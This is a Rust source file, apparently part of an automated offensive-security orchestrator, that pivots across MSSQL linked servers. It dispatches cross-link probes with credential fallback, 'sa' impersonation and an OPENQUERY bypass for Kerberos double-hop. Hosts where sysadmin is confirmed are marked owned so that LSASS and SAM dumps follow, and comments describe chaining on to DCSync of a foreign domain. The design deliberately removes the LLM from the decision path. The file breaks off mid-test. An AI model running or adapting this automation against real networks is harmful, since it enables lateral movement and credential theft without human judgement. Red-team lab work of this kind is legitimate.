//! auto_mssql_link_pivot — deterministic cross-server pivot via `mssql_exec_linked`.
//!
//! The companion `auto_mssql_exploitation` automation hands the LLM an
//! "objectives" wishlist when an `mssql_linked_server` vulnerability is
//! confirmed exploited and trusts the LLM to issue `mssql_exec_linked` /
//! `mssql_openquery` against the named link. In practice the LLM frequently
//! completes the round without ever firing the cross-link primitive,
//! leaving the pivot untouched while the deep-exploit dedup permanently
//! locks the vuln (observed repeatedly in long-running ops where the
//! source-side MSSQL is reachable, the linked server is enumerated, but
//! no remote SELECT ever hits the wire).
//!
//! This automation removes the LLM from the critical path: for every
//! exploited `mssql_linked_server` vuln, dispatch `mssql_exec_linked`
//! directly via the tool dispatcher with a probe SELECT that identifies
//! the remote principal and sysadmin status. Result-driven dedup — only
//! mark dedup on success or after `MAX_PIVOT_ATTEMPTS` retries, so a
//! transient auth race does not bury the primitive.

use std::sync::Arc;
use std::time::Duration;

use serde_json::{json, Value};
use tokio::sync::watch;
use tracing::{info, warn};

use ares_llm::ToolCall;

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

use super::mssql_exploitation::resolve_mssql_target_ip;

/// Bounded retries before we accept the pivot as unworkable for now.
/// Each attempt is a single `mssql_exec_linked` round-trip; three is
/// generous enough for transient races (kerberos clock skew, the LLM
/// round queueing behind the link discovery) without burning the slot
/// indefinitely on a genuinely broken stored login mapping.
const MAX_PIVOT_ATTEMPTS: u32 = 3;

/// Probe query — a single SELECT that identifies who we are on the
/// remote side and whether we have sysadmin. Three columns, no DDL,
/// no xp_cmdshell — minimum primitive that proves the cross-link auth
/// is workable. Once this succeeds the orchestrator knows the link
/// hop is viable and downstream automation (or the existing LLM
/// deep-exploit round) can chain xp_cmdshell.
const PROBE_QUERY: &str =
    "SELECT SYSTEM_USER AS who, IS_SRVROLEMEMBER('sysadmin') AS is_sa, @@SERVERNAME AS srv;";

/// Monitors for exploited `mssql_linked_server` vulns and fires the
/// deterministic cross-link probe. Interval: 45s.
pub async fn auto_mssql_link_pivot(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("mssql_access") {
            continue;
        }

        let work = collect_pivot_work(&dispatcher).await;
        for item in work {
            // Mark the dedup BEFORE spawning so a fast subsequent tick
            // doesn't double-dispatch the same probe while the first is
            // in flight. The spawned task clears the dedup on probe
            // failure (under the attempt cap) so the next tick can
            // retry.
            {
                let mut state = dispatcher.state.write().await;
                state.mark_processed(DEDUP_MSSQL_LINK_PIVOT, item.dedup_key.clone());
            }
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_MSSQL_LINK_PIVOT, &item.dedup_key)
                .await;

            let dispatcher_bg = dispatcher.clone();
            tokio::spawn(async move {
                run_pivot_probe(dispatcher_bg, item).await;
            });
        }
    }
}

#[derive(Debug, Clone)]
struct PivotWork {
    vuln_id: String,
    dedup_key: String,
    target_ip: String,
    linked_server: String,
    cred_username: String,
    cred_domain: String,
    impersonate_user: Option<String>,
}

/// Has any `mssql_impersonation` vuln on the same `target` been marked
/// exploited? Used by the linked-server pivot to fire as soon as
/// `auto_mssql_impersonation` confirms `EXECUTE AS LOGIN` worked, even
/// though the `mssql_linked_server` vuln itself hasn't been independently
/// exploited yet (the impersonation chain is what gives us the rights for
/// the cross-link openquery hop in the first place).
fn same_target_impersonation_exploited(state: &StateInner, target: &str) -> bool {
    if target.is_empty() {
        return false;
    }
    state.discovered_vulnerabilities.values().any(|v| {
        v.vuln_type.eq_ignore_ascii_case("mssql_impersonation")
            && v.target == target
            && state.exploited_vulnerabilities.contains(&v.vuln_id)
    })
}

async fn collect_pivot_work(dispatcher: &Dispatcher) -> Vec<PivotWork> {
    let state = dispatcher.state.read().await;
    state
        .discovered_vulnerabilities
        .values()
        .filter(|v| v.vuln_type.eq_ignore_ascii_case("mssql_linked_server"))
        // Source-side access has to be confirmed before a cross-link
        // probe can succeed — no point firing if we never authenticated
        // to the source MSSQL. Accept EITHER the linked_server vuln itself
        // being exploited (LLM round confirmed access) OR a same-target
        // `mssql_impersonation` being exploited (PR 3:
        // `auto_mssql_impersonation` just landed EXECUTE AS LOGIN, which
        // proves source-side access AND grants the rights typically needed
        // for openquery hops — see plan-loot-gaps.md §1E).
        .filter_map(|vuln| {
            let has_link_access = state.exploited_vulnerabilities.contains(&vuln.vuln_id);
            let has_impersonation = same_target_impersonation_exploited(&state, &vuln.target);
            if !has_link_access && !has_impersonation {
                return None;
            }

            let linked_server = vuln
                .details
                .get("linked_server")
                .and_then(|v| v.as_str())
                .filter(|s| !s.is_empty())?
                .to_string();
            let target_ip = resolve_mssql_target_ip(&vuln.details, &vuln.target);
            if target_ip.is_empty() {
                return None;
            }
            let domain = vuln
                .details
                .get("domain")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();

            let dedup_key = format!("{}:{}", vuln.vuln_id, linked_server);
            if state.is_processed(DEDUP_MSSQL_LINK_PIVOT, &dedup_key) {
                return None;
            }

            // Same-domain credential preferred so the source-side bind
            // doesn't fall through to Guest. Trusted-domain fallback
            // mirrors the deep-exploit automation: the link hop rides
            // the stored login mapping on the remote side, so any cred
            // that authenticates to the source server is a valid trigger.
            let same_domain = state.credentials.iter().find(|c| {
                !c.password.is_empty()
                    && !state.is_principal_quarantined(&c.username, &c.domain)
                    && (domain.is_empty() || c.domain.eq_ignore_ascii_case(&domain))
            });
            let trust_fallback = if domain.is_empty() {
                None
            } else {
                state.find_trust_credential(&domain)
            };
            let cred = same_domain.cloned().or(trust_fallback)?;

            Some(PivotWork {
                vuln_id: vuln.vuln_id.clone(),
                dedup_key,
                target_ip,
                linked_server,
                cred_username: cred.username,
                cred_domain: cred.domain,
                impersonate_user: has_impersonation.then(|| "sa".to_string()),
            })
        })
        .collect()
}

async fn run_pivot_probe(dispatcher: Arc<Dispatcher>, item: PivotWork) {
    // The credential resolver in the local tool dispatcher injects the
    // password from operation state given (username, domain), so we only
    // ship identity here — never plaintext secrets.
    let tool_args = build_probe_args(&item);

    let task_id = format!(
        "mssql_link_pivot_{}",
        &uuid::Uuid::new_v4().simple().to_string()[..12]
    );
    let call = ToolCall {
        id: format!("mssql_exec_linked_{}", uuid::Uuid::new_v4().simple()),
        name: "mssql_exec_linked".to_string(),
        arguments: tool_args,
    };

    info!(
        task_id = %task_id,
        vuln_id = %item.vuln_id,
        target = %item.target_ip,
        linked_server = %item.linked_server,
        "MSSQL link pivot probe dispatched (direct tool, no LLM)"
    );

    let result = dispatcher
        .llm_runner
        .tool_dispatcher()
        .dispatch_tool("lateral", &task_id, &call)
        .await;

    let outcome = classify_probe_result(&result);

    // Cross-forest fallback: when `EXEC AT [link]` fails with a shape that
    // looks like Kerberos double-hop / SSPI rejection, retry the same
    // probe through `OPENQUERY([link], ...)` which uses the linked
    // server's stored `sp_addlinkedsrvlogin` mapping and bypasses
    // delegation entirely. This is the canonical cross-forest pivot
    // path documented in `auto_mssql_exploitation` (the LLM prompt
    // already names it, but the deterministic chain never tried it).
    let outcome = match outcome {
        ProbeOutcome::Confirmed(o) => ProbeOutcome::Confirmed(o),
        other if probe_failure_is_cross_forest_shape(&other) => {
            info!(
                vuln_id = %item.vuln_id,
                target = %item.target_ip,
                linked_server = %item.linked_server,
                first_summary = %describe_outcome(&other),
                "MSSQL link pivot: EXEC AT failed with cross-forest auth shape — \
                 retrying via OPENQUERY (stored linked-login mapping bypasses double-hop)"
            );
            run_openquery_fallback(&dispatcher, &item, other).await
        }
        other => other,
    };

    handle_probe_outcome(&dispatcher, &item, outcome).await;
}

/// Wrap the `dispatch_tool` result into a `ProbeOutcome` according to the
/// `mssql_exec_linked` / `mssql_openquery` contract: tool error → ToolError,
/// stdout matches the probe column header → Confirmed, otherwise NoEvidence.
/// Extracted so the EXEC AT and OPENQUERY paths share one classifier.
fn classify_probe_result(result: &anyhow::Result<ares_llm::ToolExecResult>) -> ProbeOutcome {
    match result {
        Ok(exec) => {
            if let Some(err) = exec.error.clone() {
                ProbeOutcome::ToolError(err, exec.output.clone())
            } else if probe_output_is_remote_select(&exec.output) {
                ProbeOutcome::Confirmed(exec.output.clone())
            } else {
                ProbeOutcome::NoEvidence(exec.output.clone())
            }
        }
        Err(e) => ProbeOutcome::DispatchFailure(e.to_string()),
    }
}

/// Cross-forest signature on a failed `mssql_exec_linked` probe. The
/// `EXEC AT [link]` hop double-hops the principal's identity to the linked
/// server, which a cross-forest trust does not allow without explicit
/// Kerberos delegation. The resulting SQL Server error surface is narrow
/// and stable across versions:
///   - `Login failed for user '<domain>\<user>'` — SQL accepted the
///     source-side connection then rejected the cross-link auth
///   - `Cannot generate SSPI context` — Kerberos failed to materialise a
///     service ticket for the linked server (the classic double-hop tell)
///   - `SSPI handshake failed` — same root cause, surface from newer
///     impacket / SQL builds
///   - `KDC_ERR_*` — explicit Kerberos error punted up by impacket's
///     krb5 stack
///   - `the trust relationship between this workstation and the primary
///     domain failed` — surfaces on older SQL builds
///
/// We deliberately keep this narrow: a generic "remote query is disabled"
/// or "linked server does not exist" should NOT trigger the OPENQUERY
/// retry — those are configuration issues on the link, not auth issues
/// that OPENQUERY's stored-cred path could route around.
fn probe_failure_is_cross_forest_shape(outcome: &ProbeOutcome) -> bool {
    let (err, out) = match outcome {
        ProbeOutcome::ToolError(e, o) => (e.as_str(), o.as_str()),
        ProbeOutcome::NoEvidence(o) => ("", o.as_str()),
        // DispatchFailure is a transport / queue error — not an auth
        // shape, so OPENQUERY wouldn't help. Bail.
        ProbeOutcome::DispatchFailure(_) | ProbeOutcome::Confirmed(_) => return false,
    };
    let blob = format!("{err}\n{out}").to_ascii_lowercase();
    blob.contains("login failed for user")
        || blob.contains("cannot generate sspi context")
        || blob.contains("sspi handshake failed")
        || blob.contains("kdc_err_")
        || blob.contains("the trust relationship")
        || blob.contains("double-hop")
        || blob.contains("delegation not permitted")
}

/// Dispatch the OPENQUERY fallback after EXEC AT failed cross-forest. The
/// same `PROBE_QUERY` flows through `OPENQUERY([link], '<query>')` which
/// rides the stored remote login (`sp_addlinkedsrvlogin`) instead of
/// double-hopping the connecting principal's identity. If OPENQUERY also
/// fails, return the first-attempt outcome so the failure summary in
/// `handle_probe_outcome` stays the more diagnostic EXEC AT error.
async fn run_openquery_fallback(
    dispatcher: &Dispatcher,
    item: &PivotWork,
    first_outcome: ProbeOutcome,
) -> ProbeOutcome {
    let tool_args = build_probe_args(item);
    let task_id = format!(
        "mssql_link_pivot_oq_{}",
        &uuid::Uuid::new_v4().simple().to_string()[..12]
    );
    let call = ToolCall {
        id: format!("mssql_openquery_{}", uuid::Uuid::new_v4().simple()),
        name: "mssql_openquery".to_string(),
        arguments: tool_args,
    };

    let result = dispatcher
        .llm_runner
        .tool_dispatcher()
        .dispatch_tool("lateral", &task_id, &call)
        .await;

    let oq_outcome = classify_probe_result(&result);
    if matches!(oq_outcome, ProbeOutcome::Confirmed(_)) {
        info!(
            vuln_id = %item.vuln_id,
            linked_server = %item.linked_server,
            "MSSQL link pivot: OPENQUERY fallback confirmed cross-forest hop \
             (stored linked-login mapping); EXEC AT was blocked by double-hop"
        );
        oq_outcome
    } else {
        // OPENQUERY didn't surface evidence either. Surface the first
        // attempt's outcome so the failure summary captures the EXEC AT
        // error (more diagnostic than OPENQUERY's "no rows" line).
        first_outcome
    }
}

#[derive(Debug)]
enum ProbeOutcome {
    /// Tool reported success AND the output looks like a real remote SELECT
    /// result (column header, value row). Cross-link auth is confirmed.
    Confirmed(String),
    /// Tool exited 0 but the output doesn't include the probe columns —
    /// usually means the link returned an empty set or the wrapper logged
    /// without producing rows. Treat as a soft failure for retry purposes.
    NoEvidence(String),
    /// Tool itself reported a non-zero exit (linked-server auth rejected,
    /// remote sproc not enabled, etc.). Retryable up to the attempt cap.
    ToolError(String, String),
    /// Couldn't dispatch at all — network/queue/transport issue. Retryable.
    DispatchFailure(String),
}

/// Heuristic: did the tool stdout actually contain rows from the remote
/// SELECT, or is it just impacket's wrapper noise around an empty result?
/// `mssql_exec_linked` runs through impacket's `mssqlclient.py`, which
/// echoes column headers verbatim when a SELECT returns rows. Looking
/// for the column aliases (`who`, `is_sa`, `srv`) is a tighter signal
/// than checking exit code, which is 0 even when the link returns no
/// rows.
fn probe_output_is_remote_select(output: &str) -> bool {
    let lower = output.to_ascii_lowercase();
    lower.contains("who") && lower.contains("is_sa") && lower.contains("srv")
}

/// Did the probe data row indicate `IS_SRVROLEMEMBER('sysadmin') = 1` on the
/// linked-server side? When sysadmin is true, the cross-link auth landed us
/// in a context that can xp_cmdshell and dump SAM/LSA — equivalent to local
/// admin on the linked-server host. The caller then marks that host owned so
/// `auto_lsassy_dump` / `auto_local_admin_secretsdump` can fire against it.
///
/// Heuristic: find a data row that contains both the linked-server name and
/// a standalone `1` token (the value column for `is_sa`). impacket's
/// mssqlclient.py emits fixed-column-aligned rows; whitespace split is
/// unambiguous because `who` is the only field that can contain spaces and
/// it's always before `is_sa` and `srv` columns.
fn probe_output_indicates_sysadmin(output: &str, linked_server: &str) -> bool {
    if !probe_output_is_remote_select(output) {
        return false;
    }
    let ls_lower = linked_server.to_lowercase();
    for line in output.lines() {
        let line_lower = line.to_lowercase();
        if !line_lower.contains(&ls_lower) {
            continue;
        }
        // The data row contains the linked-server name. Look for a standalone
        // `1` token in the same line — that's the is_sa value.
        if line.split_whitespace().any(|tok| tok == "1") {
            return true;
        }
    }
    false
}

/// Best-effort: map the linked-server SQL name to a host IP in state by
/// matching the leading label of any host's hostname (case-insensitive).
/// Returns the IP if a unique-enough match exists; `None` otherwise so the
/// caller skips the ownership upgrade.
fn resolve_linked_server_host_ip(state: &StateInner, linked_server: &str) -> Option<String> {
    let target = linked_server.to_lowercase();
    state
        .hosts
        .iter()
        .find(|h| {
            !h.ip.is_empty()
                && !h.hostname.is_empty()
                && (h.hostname.to_lowercase() == target
                    || h.hostname
                        .to_lowercase()
                        .split('.')
                        .next()
                        .map(|s| s == target)
                        .unwrap_or(false))
        })
        .map(|h| h.ip.clone())
}

/// Credit the scoreboard primitive for a confirmed link pivot. The
/// deterministic probe dispatches via `dispatch_tool` (task_id
/// `mssql_link_pivot_*`), bypassing the `exploit_*` gate in
/// result_processing — so the standard mark_exploited path never fires
/// for this vuln_id even when the chain confirmed an end-to-end remote
/// SELECT. Without this explicit call,
/// `mssql_linked_server_<ip>_<server>` scoreboard tokens are emitted
/// only by the LLM-routed mssql_exploitation path; the deterministic
/// confirmation here goes uncredited.
async fn credit_pivot_exploited(
    state: &SharedState,
    queue: &crate::orchestrator::task_queue::TaskQueueCore<
        impl redis::aio::ConnectionLike + Clone + Send + Sync + 'static,
    >,
    vuln_id: &str,
) {
    if let Err(e) = state.mark_exploited(queue, vuln_id).await {
        warn!(
            err = %e,
            vuln_id = %vuln_id,
            "Failed to mark mssql_linked_server exploited \
             (probe confirmed but token not emitted)"
        );
    }
}

async fn handle_probe_outcome(dispatcher: &Dispatcher, item: &PivotWork, outcome: ProbeOutcome) {
    match outcome {
        ProbeOutcome::Confirmed(output) => {
            let tail = tail_lines(&output, 8);
            let is_sa = probe_output_indicates_sysadmin(&output, &item.linked_server);
            info!(
                vuln_id = %item.vuln_id,
                linked_server = %item.linked_server,
                is_sa,
                output_tail = %tail,
                "MSSQL link pivot confirmed — remote SELECT returned rows; \
                 cross-link primitive is workable (dedup locked permanently)"
            );
            {
                // Clear the attempt counter — confirmed pivots don't need it
                // sticking around on the StateInner map.
                let mut state = dispatcher.state.write().await;
                state.mssql_link_pivot_attempts.remove(&item.dedup_key);
            }

            credit_pivot_exploited(&dispatcher.state, &dispatcher.queue, &item.vuln_id).await;

            // When the link hop runs as sysadmin on the remote SQL Server, the
            // resulting principal can xp_cmdshell, which is local-admin-
            // equivalent on the host running the SQL Server. Mark that host
            // owned so `auto_lsassy_dump` and `auto_local_admin_secretsdump`
            // start firing against it — that's how cross-forest member
            // servers get their SAM/LSA harvested without an explicit
            // secretsdump path. Confirmed manually end-to-end: the link hop
            // can reach sysadmin via a stored `sa` login mapping, and the
            // subsequent SAM/LSA dump surfaces cached domain credentials that
            // `auto_credential_reuse` then uses to DCSync the foreign DC.
            if is_sa {
                let host_ip = {
                    let state = dispatcher.state.read().await;
                    resolve_linked_server_host_ip(&state, &item.linked_server)
                };
                if let Some(ip) = host_ip {
                    match dispatcher
                        .state
                        .mark_host_owned(&dispatcher.queue, &ip)
                        .await
                    {
                        Ok(()) => info!(
                            linked_server = %item.linked_server,
                            host_ip = %ip,
                            "Marked linked-server host owned (sysadmin via MSSQL link); \
                             lsassy_dump and local_admin_secretsdump will now target it"
                        ),
                        Err(e) => warn!(
                            err = %e,
                            linked_server = %item.linked_server,
                            host_ip = %ip,
                            "Failed to mark linked-server host owned after sysadmin pivot"
                        ),
                    }
                } else {
                    warn!(
                        linked_server = %item.linked_server,
                        "Cross-link sysadmin confirmed but no matching host in state.hosts; \
                         ownership upgrade skipped (lsassy/local-admin chains won't auto-fire)"
                    );
                }
            }
        }
        other => {
            let attempts = {
                let mut state = dispatcher.state.write().await;
                let count = state
                    .mssql_link_pivot_attempts
                    .entry(item.dedup_key.clone())
                    .or_insert(0);
                *count += 1;
                *count
            };

            let summary = describe_outcome(&other);
            if attempts < MAX_PIVOT_ATTEMPTS {
                warn!(
                    vuln_id = %item.vuln_id,
                    linked_server = %item.linked_server,
                    attempts,
                    max_attempts = MAX_PIVOT_ATTEMPTS,
                    summary = %summary,
                    "MSSQL link pivot probe failed — clearing dedup for retry"
                );
                // Clear dedup so the next tick re-fires the probe.
                {
                    let mut state = dispatcher.state.write().await;
                    state.unmark_processed(DEDUP_MSSQL_LINK_PIVOT, &item.dedup_key);
                }
                let _ = dispatcher
                    .state
                    .unpersist_dedup(&dispatcher.queue, DEDUP_MSSQL_LINK_PIVOT, &item.dedup_key)
                    .await;
            } else {
                warn!(
                    vuln_id = %item.vuln_id,
                    linked_server = %item.linked_server,
                    attempts,
                    summary = %summary,
                    "MSSQL link pivot probe gave up after MAX_PIVOT_ATTEMPTS — \
                     dedup locked; downstream LLM round may still attempt the hop"
                );
            }
        }
    }
}

fn describe_outcome(o: &ProbeOutcome) -> String {
    match o {
        ProbeOutcome::Confirmed(_) => "confirmed".into(),
        ProbeOutcome::NoEvidence(out) => {
            format!("tool_ok_but_no_rows: {}", tail_lines(out, 3))
        }
        ProbeOutcome::ToolError(err, out) => {
            format!("tool_error: {err} — {}", tail_lines(out, 3))
        }
        ProbeOutcome::DispatchFailure(e) => format!("dispatch_failure: {e}"),
    }
}

fn tail_lines(s: &str, n: usize) -> String {
    let lines: Vec<&str> = s.lines().rev().take(n).collect();
    let mut out: Vec<&str> = lines.into_iter().rev().collect();
    if out.is_empty() {
        return String::new();
    }
    let total = out.iter().map(|l| l.len() + 3).sum::<usize>();
    if total > 800 {
        out.truncate(2);
    }
    out.join(" | ")
}

fn build_probe_args(item: &PivotWork) -> Value {
    let mut tool_args = json!({
        "target": item.target_ip,
        "username": item.cred_username,
        "linked_server": item.linked_server,
        "query": PROBE_QUERY,
    });
    if !item.cred_domain.is_empty() {
        tool_args["domain"] = json!(item.cred_domain);
        tool_args["windows_auth"] = json!(true);
    }
    if let Some(ref impersonate_user) = item.impersonate_user {
        tool_args["impersonate_user"] = json!(impersonate_user);
    }
    tool_args
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_work() -> PivotWork {
        PivotWork {
            vuln_id: "mssql_linked_server_192.168.58.51_SQL".into(),
            dedup_key: "mssql_linked_server_192.168.58.51_SQL:SQL".into(),
            target_ip: "192.168.58.51".into(),
            linked_server: "SQL".into(),
            cred_username: "svc_sql".into(),
            cred_domain: "contoso.local".into(),
            impersonate_user: None,
        }
    }

    #[test]
    fn probe_args_carry_linked_server_and_query() {
        let args = build_probe_args(&sample_work());
        assert_eq!(args["target"], "192.168.58.51");
        assert_eq!(args["username"], "svc_sql");
        assert_eq!(args["domain"], "contoso.local");
        assert_eq!(args["windows_auth"], true);
        assert_eq!(args["linked_server"], "SQL");
        assert_eq!(args["query"].as_str().unwrap(), PROBE_QUERY);
        // Plaintext secrets MUST NOT be in the probe args — the local
        // tool dispatcher's credential resolver injects them after lookup.
        assert!(args.get("password").is_none());
        assert!(args.get("hash").is_none());
    }

    #[test]
    fn probe_args_omit_domain_when_unknown() {
        let mut item = sample_work();
        item.cred_domain = String::new();
        let args = build_probe_args(&item);
        assert!(args.get("domain").is_none());
        assert!(args.get("windows_auth").is_none());
    }

    #[test]
    fn probe_args_wrap_link_hop_when_impersonation_confirmed() {
        let mut item = sample_work();
        item.impersonate_user = Some("sa".into());
        let args = build_probe_args(&item);
        assert_eq!(args["impersonate_user"], "sa");
    }

    #[test]
    fn probe_query_uses_only_safe_select_columns() {
        // Defensive: PROBE_QUERY must stay a single read-only SELECT —
        // anything else changes the cost model (DDL on a remote link is
        // a much louder primitive than a read).
        let q = PROBE_QUERY.to_ascii_uppercase();
        assert!(q.contains("SELECT"));
        for forbidden in ["EXEC", "INSERT", "UPDATE", "DELETE", "DROP", "XP_CMDSHELL"] {
            assert!(
                !q.contains(forbidden),
                "PROBE_QUERY must not contain {forbidden} — found in: {PROBE_QUERY}"
            );
        }
    }

    #[test]
    fn probe_output_recognised_as_remote_select() {
        let out = "SQL> SELECT ...\nwho                is_sa  srv\n--                 -----  ---\nDC01\\svc_sql       1     SQL01";
        assert!(probe_output_is_remote_select(out));
    }

    #[test]
    fn probe_output_no_rows_not_recognised() {
        let out = "SQL> EXEC (...) AT [SQL]\n[*] Connecting...\n[!] Login failed for user";
        assert!(!probe_output_is_remote_select(out));
    }

    #[test]
    fn probe_output_partial_match_not_recognised() {
        // Only one of the three column aliases present — not a probe row.
        let out = "who knows what happened here";
        assert!(!probe_output_is_remote_select(out));
    }

    #[test]
    fn describe_outcome_summarises_each_variant() {
        assert_eq!(
            describe_outcome(&ProbeOutcome::Confirmed("ok".into())),
            "confirmed"
        );
        assert!(
            describe_outcome(&ProbeOutcome::NoEvidence("foo".into())).starts_with("tool_ok_but")
        );
        assert!(
            describe_outcome(&ProbeOutcome::ToolError("auth".into(), "bar".into()))
                .starts_with("tool_error")
        );
        assert!(
            describe_outcome(&ProbeOutcome::DispatchFailure("net".into()))
                .starts_with("dispatch_failure")
        );
    }

    #[test]
    fn tail_lines_returns_last_n_in_order() {
        let s = "one\ntwo\nthree\nfour";
        assert_eq!(tail_lines(s, 2), "three | four");
    }

    #[test]
    fn tail_lines_handles_empty_input() {
        assert_eq!(tail_lines("", 5), "");
    }

    #[test]
    fn dedup_key_format_includes_link_name() {
        let item = sample_work();
        assert!(item.dedup_key.contains(&item.vuln_id));
        assert!(item.dedup_key.contains(&item.linked_server));
    }

    #[test]
    fn max_pivot_attempts_is_bounded() {
        // Sanity check — if someone bumps this they should also reconsider
        // the per-source rate limit and the dedup-clear cost.
        assert!((2..=6).contains(&MAX_PIVOT_ATTEMPTS));
    }

    #[test]
    fn probe_sysadmin_recognised_when_data_row_has_is_sa_one() {
        // Real impacket mssqlclient output: fixed-column data row with the
        // linked-server name and `1` in the is_sa column.
        let out = "SQL> SELECT SYSTEM_USER AS who, IS_SRVROLEMEMBER('sysadmin') AS is_sa, @@SERVERNAME AS srv;\n\
                   who                          is_sa   srv\n\
                   --------------------------   -----   --------\n\
                   nt service\\mssql$sqlexpress 1       SQL01";
        assert!(probe_output_indicates_sysadmin(out, "SQL01"));
    }

    #[test]
    fn probe_sysadmin_rejected_when_is_sa_zero() {
        // Non-sysadmin context — link auth landed but the remote principal
        // is a regular user. We must NOT mark the host owned in this case.
        let out = "SQL> SELECT ...;\n\
                   who              is_sa  srv\n\
                   --------------   -----  --------\n\
                   guest            0      SQL01";
        assert!(!probe_output_indicates_sysadmin(out, "SQL01"));
    }

    #[test]
    fn probe_sysadmin_rejected_when_columns_missing() {
        // No probe columns in output — must reject regardless of stray `1`s.
        let out = "[!] Login failed for user '1' on SQL01";
        assert!(!probe_output_indicates_sysadmin(out, "SQL01"));
    }

    #[test]
    fn resolve_linked_server_host_by_short_name() {
        use ares_core::models::Host;
        let mut state = StateInner::new("op-test".into());
        state.hosts.push(Host {
            ip: "192.168.58.51".into(),
            hostname: "sql01.contoso.local".into(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc: false,
            owned: false,
        });
        // Linked-server SQL name "SQL01" should match host "sql01.contoso.local"
        // by leading-label comparison (case-insensitive).
        assert_eq!(
            resolve_linked_server_host_ip(&state, "SQL01"),
            Some("192.168.58.51".into())
        );
    }

    #[test]
    fn resolve_linked_server_host_returns_none_when_no_match() {
        use ares_core::models::Host;
        let mut state = StateInner::new("op-test".into());
        state.hosts.push(Host {
            ip: "192.168.58.51".into(),
            hostname: "dc01.contoso.local".into(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc: true,
            owned: false,
        });
        assert_eq!(resolve_linked_server_host_ip(&state, "SQL01"), None);
    }

    #[test]
    fn same_target_impersonation_exploited_unlocks_pivot_gate() {
        // PR 3 plan §1E: once `auto_mssql_impersonation` confirms
        // EXECUTE AS LOGIN landed and marks the impersonation vuln
        // exploited, the linked-server pivot's gate must accept the
        // SAME-target linked_server vuln even if that vuln hasn't been
        // independently exploited yet. This is what closes the
        // source-MSSQL→remote-MSSQL hop without waiting for the LLM to
        // re-discover the linked-server primitive.
        use ares_core::models::VulnerabilityInfo;
        use std::collections::HashMap;

        let mut state = StateInner::new("op-test".into());

        let mut imp_details = HashMap::new();
        imp_details.insert("account_name".into(), serde_json::json!("svc_sql"));
        imp_details.insert("domain".into(), serde_json::json!("contoso.local"));
        let imp = VulnerabilityInfo {
            vuln_id: "mssql_impersonation_192.168.58.51".into(),
            vuln_type: "mssql_impersonation".into(),
            target: "192.168.58.51".into(),
            discovered_by: "mssql_enum_impersonation".into(),
            discovered_at: chrono::Utc::now(),
            details: imp_details,
            recommended_agent: "privesc".into(),
            priority: 3,
        };
        state
            .discovered_vulnerabilities
            .insert(imp.vuln_id.clone(), imp.clone());
        state.exploited_vulnerabilities.insert(imp.vuln_id.clone());

        assert!(same_target_impersonation_exploited(&state, "192.168.58.51"));
        // Different target — pivot gate must NOT open.
        assert!(!same_target_impersonation_exploited(
            &state,
            "192.168.58.99"
        ));
        // Empty target — defensive: must NOT open.
        assert!(!same_target_impersonation_exploited(&state, ""));
    }

    #[test]
    fn same_target_impersonation_not_exploited_keeps_gate_closed() {
        // Negative case: an impersonation vuln exists on the same target
        // but has NOT been exploited — the linked-server pivot must stay
        // gated. This guards against firing the pivot from a stale
        // mssql_impersonation row that never landed EXECUTE AS LOGIN.
        use ares_core::models::VulnerabilityInfo;
        use std::collections::HashMap;

        let mut state = StateInner::new("op-test".into());
        let imp = VulnerabilityInfo {
            vuln_id: "mssql_impersonation_192.168.58.51".into(),
            vuln_type: "mssql_impersonation".into(),
            target: "192.168.58.51".into(),
            discovered_by: "mssql_enum_impersonation".into(),
            discovered_at: chrono::Utc::now(),
            details: HashMap::new(),
            recommended_agent: "privesc".into(),
            priority: 3,
        };
        state
            .discovered_vulnerabilities
            .insert(imp.vuln_id.clone(), imp);
        // NOT inserted into exploited_vulnerabilities.

        assert!(!same_target_impersonation_exploited(
            &state,
            "192.168.58.51"
        ));
    }

    #[tokio::test]
    async fn credit_pivot_exploited_marks_vuln_and_records_event() {
        // Confirmed probe outcome must mark the linked-server vuln
        // exploited so dreadgoad's scoreboard credits the primitive even
        // though the probe dispatched via `dispatch_tool` (which bypasses
        // the normal `exploit_*` gate in result_processing).
        use crate::orchestrator::task_queue::TaskQueueCore;
        use ares_core::models::OpStateEventPayload;
        use ares_core::state::mock_redis::MockRedisConnection;

        let recorder = std::sync::Arc::new(ares_core::op_state_log::OpStateRecorder::capturing());
        let state = SharedState::with_recorder("op-pivot".to_string(), recorder.clone());
        let queue = TaskQueueCore::from_connection(MockRedisConnection::new());

        let vuln_id = "mssql_linked_server_192.168.58.51_SQL01";
        credit_pivot_exploited(&state, &queue, vuln_id).await;

        let inner = state.read().await;
        assert!(inner.exploited_vulnerabilities.contains(vuln_id));
        drop(inner);

        let evs = recorder.captured().await;
        assert!(evs.iter().any(|e| matches!(
            &e.payload,
            OpStateEventPayload::VulnExploited { vuln_id: v, .. } if v == vuln_id
        )));
    }

    #[test]
    fn resolve_linked_server_host_ignores_empty_hostname() {
        // A host record with empty hostname must not match the empty leading
        // label — that would mass-pwn every IP-only host on a single link.
        use ares_core::models::Host;
        let mut state = StateInner::new("op-test".into());
        state.hosts.push(Host {
            ip: "192.168.58.51".into(),
            hostname: String::new(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc: false,
            owned: false,
        });
        assert_eq!(resolve_linked_server_host_ip(&state, ""), None);
        assert_eq!(resolve_linked_server_host_ip(&state, "SQL01"), None);
    }

    // ── probe_failure_is_cross_forest_shape ────────────────────────────

    #[test]
    fn cross_forest_shape_matches_login_failed_for_user() {
        // Classic cross-forest double-hop failure: SQL accepts the
        // source-side connection then rejects the cross-link auth with
        // a `Login failed for user '<domain>\<user>'` row.
        let outcome = ProbeOutcome::ToolError(
            "exit 1".into(),
            "Msg 18456, Level 14, State 1\n\
             Login failed for user 'FOREST1\\alice'."
                .into(),
        );
        assert!(probe_failure_is_cross_forest_shape(&outcome));
    }

    #[test]
    fn cross_forest_shape_matches_sspi_context() {
        let outcome = ProbeOutcome::ToolError(
            "exit 1".into(),
